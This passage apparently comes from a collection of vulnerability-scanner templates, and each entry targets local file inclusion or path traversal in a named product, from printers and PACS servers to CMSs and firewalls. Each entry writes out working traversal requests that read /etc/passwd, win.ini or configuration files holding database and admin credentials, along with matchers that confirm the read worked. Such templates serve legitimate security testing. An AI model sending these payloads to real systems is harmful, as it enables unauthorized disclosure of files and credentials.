- {{BaseURL}}/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Kyocera Command Center RX ECOSYS M2035dn - Local File Inclusion

## Description

- Kyocera Command Center RX ECOSYS M2035dn is vulnerable to unauthenticated local file inclusion.
- severity - high
- tags - edb,printer,iot,kyocera,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/js/../../../../../../../../etc/passwd%00.jpg

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Bullwark Momentum Series JAWS 1.0 - Local File Inclusion

## Description

- Bullwark Momentum Series JAWS 1.0 is vulnerable to local file inclusion.
- severity - high
- tags - lfi,edb,bullwark

## Requests

### Step - 1

```
GET /../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Referer: {{Hostname}}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# MagicFlow - Local File Inclusion

## Description

- MagicFlow is susceptible to local file inclusion vulnerabilities because it allows remote unauthenticated users to access locally stored files on the server and return their content via the '/msa/main.xp' endpoint and the 'Fun' parameter.

- severity - high
- tags - magicflow,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd
- {{BaseURL}}/msa/../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Longjing Technology BEMS API 1.21 - Local File Inclusion

## Description

- Longjing Technology BEMS API 1.21 is vulnerable to local file inclusion. Input passed through the fileName parameter through the downloads API endpoint is not properly verified before being used to download files. This can be exploited to disclose the contents of arbitrary and sensitive files through directory traversal attacks.
- severity - high
- tags - lfi,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/downloads?fileName=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# gSOAP 2.8 - Local File Inclusion

## Description

- gSOAP 2.8 is vulnerable to local file inclusion.
- severity - high
- tags - edb,gsoap,lfi

## Requests

### Step - 1

```
GET /../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

```

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Dicoogle PACS 2.5.0 - Local File Inclusion

## Description

- Dicoogle PACS 2.5.0 is vulnerable to local file inclusion. This allows an attacker to read arbitrary files that the web user has access to. Admin credentials aren't required.
- severity - high
- tags - edb,windows,lfi,dicoogle

## Requests

- Method - GET

### URL

- {{BaseURL}}/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# CS-Cart - Local File Inclusion

## Description

- CS-Cart is vulnerable to local file inclusion because it allows remote unauthenticated attackers to access locally stored files and reveal their content.
- severity - high
- tags - cscart,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# TPshop - Local File Inclusion

## Description

- TPshop is vulnerable to local file inclusion.
- severity - high
- tags - tpshop,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../

### Matchers

**Type - word**

- words
  1. "state":"SUCCESS"

**Type - status**

- status
  1. 200

---

# FeiFeiCms - Local File Inclusion

## Description

- FeiFeiCms is vulnerable to local file inclusion.
- severity - high
- tags - feifeicms,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<?php
  2. db_name
  3. db_pwd
  4. db_host
- condition - and
- part - body

---

# Accent Microcomputers LFI

## Description

- A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve password files.
- severity - high
- tags - microcomputers,accent,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?id=50&file=../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# elFinder \<=2.1.12 - Local File Inclusion

## Description

- elFinder through 2.1.12 is vulnerable to local file inclusion via Connector.minimal.php in std42. This allows unauthenticated remote attackers to read, write, and browse files outside the configured document root. This is due to improper handling of absolute file paths.

- severity - high
- tags - lfi,elfinder

## Requests

### Step - 1

```
GET /php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Oliver 5 Library Server \<8.00.008.053 - Local File Inclusion

## Description

- Oliver 5 Library Server versions prior to 8.00.008.053 are vulnerable to local file inclusion via the FileServlet function.
- severity - high
- tags - lfi,oliver,edb,windows

## Requests

- Method - GET

### URL

- {{BaseURL}}/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# GoIP-1 GSM - Local File Inclusion

## Description

- GoIP-1 GSM is vulnerable to local file inclusion because input passed thru the 'content' or 'sidebar' GET parameter in 'frame.html' or 'frame.A100.html' is not properly sanitized before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files on the affected system.
- severity - high
- tags - gsm,goip,lfi,iot

## Requests

- Method - GET

### URL

- {{BaseURL}}/default/en_US/frame.html?content=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
- {{BaseURL}}/default/en_US/frame.A100.html?sidebar=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Softneta MedDream PACS Server Premium 6.7.1.1 - Local File Inclusion

## Description

- Softneta MedDream PACS Server Premium 6.7.1.1 is vulnerable to local file inclusion.
- severity - high
- tags - sofneta,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# PMB 5.6 - Local File Inclusion

## Description

- PMB 5.6 is vulnerable to local file inclusion.
- severity - high
- tags - lfi,pmb,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=nuclei

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. root:x:0

---

# PMB 5.6 - Local File Inclusion

## Description

- PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the 'chemin' parameter.
- severity - high
- tags - lfi,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
- {{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Eibiz i-Media Server Digital Signage 3.8.0 - Local File Inclusion

## Description

- Eibiz i-Media Server Digital Signage 3.8.0 is vulnerable to local file inclusion. An unauthenticated remote attacker can exploit this to view the contents of files located outside of the server's root directory. The issue can be triggered through the oldfile GET parameter.
- severity - high
- tags - lfi,eibiz,packetstorm,windows

## Requests

- Method - GET

### URL

- {{BaseURL}}/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Flir - Local File Inclusion

## Description

- Flir is vulnerable to local file inclusion.
- severity - high
- tags - flir,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/download.php?file=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- condition - and

**Type - status**

- status
  1. 200

---

# NatShell - Local File Inclusion

## Description

- NatShell is vulnerable to local file inclusion.
- severity - high
- tags - natshell,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/download.php?file=../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. toor:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Symantec Messaging Gateway \<=10.6.1 - Local File Inclusion

## Description

- Symantec Messaging Gateway 10.6.1 and prior are vulnerable to local file inclusion.
- severity - high
- tags - lfi,messaging,symantec

## Requests

- Method - GET

### URL

- {{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/

### Matchers

**Type - word**

- words
  1. struts-default.xml

**Type - status**

- status
  1. 200

---

# Huijietong - Local File Inclusion

## Description

- Huijietong is vulnerable to local file inclusion.
- severity - high
- tags - huijietong,lfi

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/fileDownload?action=downloadBackupFile
  - fullPath=/etc/passwd

---

# Oracle Fatwire 6.3 - Path Traversal

## Description

- Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the getSurvey.jsp endpoint.

- severity - high
- tags - lfi,oracle,fatwire,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Webbdesign SL-Studio - Local File Inclusion

## Description

- Webbdesign SL-Studio is vulnerable to local file inclusion.
- severity - high
- tags - slstudio,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?page=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Joomla! com_fabrik 3.9.11 - Local File Inclusion

## Description

- Joomla! com_fabrik 3.9.11 is vulnerable to local file inclusion.
- severity - high
- tags - joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/

### Matchers

**Type - word**

- words
  1. "value":
  2. "disable":false
  3. text
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# NUUO NVRmini 2 3.0.8 - Local File Inclusion

## Description

- NUUO NVRmini 2 3.0.8 is vulnerable to local file inclusion.
- severity - high
- tags - lfi,edb,nuuo

## Requests

- Method - GET

### URL

- {{BaseURL}}/css_parser.php?css=css_parser.php

### Matchers

**Type - word**

- part - body
- words
  1. $\_GET['css']

**Type - word**

- part - header
- words
  1. text/css

**Type - status**

- status
  1. 200

---

# Crystal Live HTTP Server 6.01 - Directory Traversal

- severity - high
- tags - lfi,crystal

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../../../../../../../../../windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# NS ASG - Local File Inclusion

## Description

- NS ASG is vulnerable to local file inclusion.
- severity - high
- tags - nsasg,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
- {{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - word**

- part - body
- words
  1. $certfile
  2. application/pdf
- condition - and

---

# UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read

## Description

- UniSharp Larevel File Manager 2.0.0 is vulnerable to arbitrary file read.
- severity - high
- tags - lfr,edb,lfi,unisharp,laravel,filemanager,fileupload

## Requests

- Method - GET

### URL

- {{BaseURL}}/laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# MetInfo \<=6.1.0 - Local File Inclusion

## Description

- MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and allows remote unauthenticated attackers access to locally stored files and their content.
- severity - high
- tags - metinfo,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php
- {{BaseURL}}/include/thumb.php?dir=.....///http/.....///config/config_db.php
- {{BaseURL}}/include/thumb.php?dir=http\\..\\..\\config\\config_db.php

### Matchers

**Type - word**

- words
  1. con_db_pass
  2. con_db_name
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Xerox DC260 EFI Fiery Controller Webtools 2.0 - Local File Inclusion

## Description

- Xerox DC260 EFI Fiery Controller Webtools 2.0 is vulnerable to local file inclusion because input passed thru the 'file' GET parameter in 'forceSave.php' script is not properly sanitized before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files on the affected system.
- severity - high
- tags - iot,xerox,disclosure,lfi,packetstorm,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wt3/forceSave.php?file=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# GeoVision Geowebserver 5.3.3 - Local File Inclusion

## Description

- GeoVision Geowebserver 5.3.3 allows remote unauthenticated attackers to disclose the content of locally stored files via local file inclusion.
- severity - high
- tags - packetstorm,geowebserver,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini
- {{BaseURL}}/Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=aaa

### Matchers

**Type - word**

- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# Wapples Web Application Firewall - Arbitrary File Download

- severity - high
- tags - wapples,firewall,lfi,authenticated

## Requests

### Step - 1

```
POST /webapi/auth HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

id={{username}}&password={{password}}

```

### Step - 2

```
GET /webapi/file/transfer?name=/../../../../../../../../etc/passwd&type=db_backup HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Payloads**- username

- password

---

# Kavita - Path Traversal

## Description

- kareadita/kavita allows Path Traversal by abusing the filename parameter of the /api/image/cover-upload.

- severity - medium
- tags - kavita,lfi,huntr

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/image/cover-upload?filename=../appsettings.json

### Matchers

**Type - word**

- part - body
- words
  1. "ConnectionStrings":
  2. "Path":
  3. "TokenKey":
- condition - and

**Type - status**

- status
  1. 200

---

# Hanming Video Conferencing - Local File Inclusion

## Description

- Hanming Video Conferencing is vulnerable to local file inclusion.
- severity - high
- tags - lfr,hanming,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
- {{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - regex**

- regex
  1. root:[x*]:0:0:

---

# EyeLock nano NXT 3.5 - Arbitrary File Retrieval

## Description

- EyeLock nano NXT suffers from a file retrieval vulnerability when input passed through the 'path' parameter to 'logdownload.php' script is not properly verified before being used to read files. This can be exploited to disclose contents of files from local resources.
- severity - high
- tags - iot,lfi,eyelock

## Requests

- Method - GET

### URL

- {{BaseURL}}/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:[x*]:0:0:
- part - body

---

# OpenCTI 3.3.1 - Local File Inclusion

## Description

- OpenCTI 3.3.1 is vulnerable to local file inclusion.
- severity - high
- tags - opencti,lfi,oss

## Requests

- Method - GET

### URL

- {{BaseURL}}/static/css//../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Mini Mouse 9.2.0 - Local File Inclusion

## Description

- Mini Mouse 9.2.0 is vulnerable to local file inclusion because it allows remote unauthenticated attackers to include and disclose the content of locally stored files via the 'file' parameter.
- severity - high
- tags - lfi,edb,minimouse

## Requests

- Method - GET

### URL

- {{BaseURL}}/file=C:%5CWindows%5Cwin.ini

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and
- part - body

---

# Hrsale 2.0.0 - Local File Inclusion

## Description

- Hrsale 2.0.0 is vulnerable to local file inclusion. This exploit allow you to download any readable file from server without permission and login session
- severity - high
- tags - hrsale,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/download?type=files&filename=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# ProcessMaker \<=3.5.4 - Local File Inclusion

## Description

- ProcessMaker 3.5.4 and prior is vulnerable to local file inclusion.
- severity - high
- tags - processmaker,lfi,edb

## Requests

### Step - 1

```
GET /../../../..//etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# yishaadmin - Local File Inclusion

## Description

- yishaadmin is vulnerable to local file inclusion via the "/admin/File/DownloadFile" endpoint and allows files to be downloaded, read or deleted without any authentication.
- severity - high
- tags - lfi,yishaadmin,huntr

## Requests

### Step - 1

```
GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0 HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# 3CX Management Console - Local File Inclusion

## Description

- 3CX Management Console is vulnerable to local file inclusion.
- severity - high
- tags - 3cx,lfi,voip

## Requests

- Method - GET

### URL

- {{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json
- {{BaseURL}}/Electron/download/windows/\windows\win.ini

### Matchers

**Type - word**

- part - body
- words
  1. CfgServerPassword
  2. CfgServerAppName
- condition - and

**Type - word**

- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Jinfornet Jreport 15.6 - Local File Inclusion

## Description

- Jinfornet Jreport 15.6 is vulnerable to local file incluion via the Jreport Help function in the SendFileServlet. Exploitaiton allows remote unauthenticated users to view any files on the Operating System with Application services user permission. This vulnerability affects Windows and Unix operating systems.
- severity - high
- tags - jreport,jinfornet,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Blue Ocean Excellence - Local File Inclusion

## Description

- Blue Ocean Excellence is vulnerable to local file inclusion.
- severity - high
- tags - blue-ocean,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/download.php?file=../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. toor:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Interlib - Local File Inclusion

## Description

- Interlib is vulnerable to local file inclusion.
- severity - high
- tags - interlib,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/interlib/report/ShowImage?localPath=etc/passwd
- {{BaseURL}}/interlib/report/ShowImage?localPath=C:\Windows\system.ini

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. for 16-bit app support
- condition - or

**Type - status**

- status
  1. 200

---

# OrbiTeam BSCW Server - Local File Inclusion

## Description

- OrbiTeam BSCW Server versions 5.0.x, 5.1.x, 5.2.4 and below, 7.3.x and below, and 7.4.3 and below are vulnerable to unauthenticated local file inclusion.

- severity - high
- tags - bscw,orbiteam,lfi,unauth,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Surreal ToDo 0.6.1.2 - Local File Inclusion

## Description

- Surreal ToDo 0.6.1.2 is vulnerable to local file inclusion via index.php and the content parameter.

- severity - high
- tags - surreal,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?content=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# MyuCMS - Local File Inclusion

## Description

- MyuCMS is vulnerable to local file inclusion.
- severity - high
- tags - myucms,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# HJTcloud - Local File Inclusion

## Description

- HJTcloud is vulnerable to local file inclusion.
- severity - high
- tags - hjtcloud,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/him/api/rest/V1.0/system/log/list?filePath=../

### Matchers

**Type - word**

- words
  1. "name":
  2. "length":
  3. "filePath":
  4. "list":
- condition - and
- part - body

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# Karel IP Phone IP1211 Web Management Panel - Local File Inclusion

## Description

- Karel IP Phone IP1211 Web Management Panel is vulnerable to local file inclusion and can allow remote attackers to access arbitrary files stored on the remote device via the 'cgiServer.exx' endpoint and the 'page' parameter.
- severity - high
- tags - karel,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# JEEWMS - Local File Inclusion

## Description

- JEEWMS is vulnerable to local file inclusion.
- severity - high
- tags - jeewms,lfi

## Requests

### Step - 1

```
GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Step - 2

```
GET /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. \[(font|extension|file)s\]
- condition - or
- part - body

**Type - status**

- status
  1. 200

---

# HUAWEI HG659 - Local File Inclusion

## Description

- HUAWEI HG659 is vulnerable to local file inclusion.
- severity - high
- tags - lfi,huawei

## Requests

- Method - GET

### URL

- {{BaseURL}}/lib///....//....//....//....//....//....//....//....//etc//passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- condition - and

**Type - status**

- status
  1. 200

---

# Kingsoft 8 - Local File Inclusion

## Description

- Kingsoft 8 is vulnerable to local file inclusion.
- severity - high
- tags - kingsoft,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/htmltopdf/downfile.php?filename=/windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. for 16-bit app support
  2. [extensions]
- condition - and

**Type - word**

- part - header
- words
  1. application/zip

**Type - status**

- status
  1. 200

---

# FineReport 8.0 - Local File Inclusion

## Description

- FIneReport 8.0 is vulnerable to local file inclusion.
- severity - high
- tags - finereport,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
- {{BaseURL}}/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml

### Matchers

**Type - word**

- words
  1. \<rootManagerName>
  2. \<rootManagerPassword>
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# HJTcloud - Local File Inclusion

## Description

- HJTcloud is vulnerable to local file inclusion.
- severity - high
- tags - hjtcloud,lfi

## Requests

### Step - 1

```
POST /fileDownload?action=downloadBackupFile HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fullPath=/etc/passwd

```

### Step - 2

```
POST /fileDownload?action=downloadBackupFile HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fullPath=/Windows/win.ini

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. bit app support
- condition - or

**Type - status**

- status
  1. 200

---

# QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure

## Description

- The QiHang Media Web application suffers from an unauthenticated file disclosure vulnerability when input passed thru the filename parameter when using the download action or thru path parameter when using the getAll action is not properly verified before being used. This can be exploited to disclose contents of files and directories from local resources.
- severity - high
- tags - qihang,lfi,disclosure

## Requests

### Step - 1

```
GET /QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx HTTP/1.1
Host: {{Hostname}}
Connection: close

```

### Matchers

**Type - word**

- part - header
- words
  1. filename=QH.aspx
  2. application/zip
- condition - and

**Type - word**

- words
  1. QH.aspx.cs
  2. QiHang.Media.Web.QH
- condition - and

**Type - status**

- status
  1. 200

---

# DSS Download - Local File Inclusion

## Description

- DSS Download is vulnerable to local file inclusion.
- severity - high
- tags - lfi,dss,lfr

## Requests

- Method - GET

### URL

- {{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0:

**Type - status**

- status
  1. 200

---

# Nginx Server - Local File Inclusion

## Description

- Nginx server is vulnerable to local file inclusion.
- severity - high
- tags - exposure,config,lfi,nginx

## Requests

- Method - GET

### URL

- {{BaseURL}}///////../../../etc/passwd
- {{BaseURL}}/static///////../../../../etc/passwd
- {{BaseURL}}///../app.js

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. app.listen
- part - body
- condition - or

**Type - status**

- status
  1. 200

---

# Asanhamayesh CMS 3.4.6 - Local File Inclusion

## Description

- Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion.
- severity - high
- tags - asanhamayesh,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/downloadfile.php?file=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Global Domains International - Local File Inclusion

## Description

- Global Domains International is vulnerable to local file inclusion.
- severity - high
- tags - globaldomains,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# MPSec ISG1000 - Local File Inclusion

## Description

- MPSec ISG1000 is vulnerable to local file inclusion.
- severity - high
- tags - mpsec,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
- {{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini

### Matchers

**Type - regex**

- regex
  1. for 16-bit app support
  2. root:.\*:0:0:
- part - body
- condition - or

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. text/plain
- part - header

---

# Kingdee EAS - Local File Inclusion

## Description

- Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.
- severity - high
- tags - kingdee,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=C://&suffix=
- {{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=/&suffix=

### Matchers

**Type - word**

- part - body
- words
  1. {"name":"Windows","path":"C:\\\\Windows","folder":true}
  2. {"name":"root","path":"/root","folder":true}
- condition - or

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# PACSOne Server 6.6.2 - Local File Inclusion

## Description

- PACSOne Server 6.6.2 is vulnerable to local file inclusion via its integrated DICOM Web Viewer.
- severity - high
- tags - pacsone,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# phpwiki 1.5.4 - Cross-Site Scripting/Local File Inclusion

## Description

- phpwiki 1.5.4 is vulnerable to cross-site scripting and local file inclusion, and allows remote unauthenticated attackers to include and return the content of locally stored files via the 'index.php' endpoint.
- severity - high
